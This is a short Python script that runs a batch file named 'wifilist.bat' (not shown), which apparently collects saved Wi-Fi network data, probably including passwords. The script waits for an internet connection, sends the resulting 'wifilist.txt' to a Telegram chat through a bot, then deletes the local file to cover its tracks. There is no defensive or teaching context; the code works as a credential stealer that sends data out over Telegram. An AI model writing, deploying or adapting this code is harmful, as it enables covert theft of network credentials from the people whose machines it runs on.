import os
import time
import requests
import telegram
import subprocess
from config import Config as BOT_SETTING

TOKEN = BOT_SETTING.TOKEN
CHATID = BOT_SETTING.CHAT_ID

subprocess.call([r'wifilist.bat'])

while(True):
    try:
        request = requests.get("http://www.google.com")
        # print("Connected to the Internet")
        break
    except:
        time.sleep(10)
        # print("No internet connection.")

with open("wifilist.txt", 'rb') as file:
            bot_auth = telegram.Bot(token = TOKEN)
            telegram.Bot.sendDocument(bot_auth, chat_id = CHATID, document = file, filename = "wifilist.txt")
os.remove("wifilist.txt")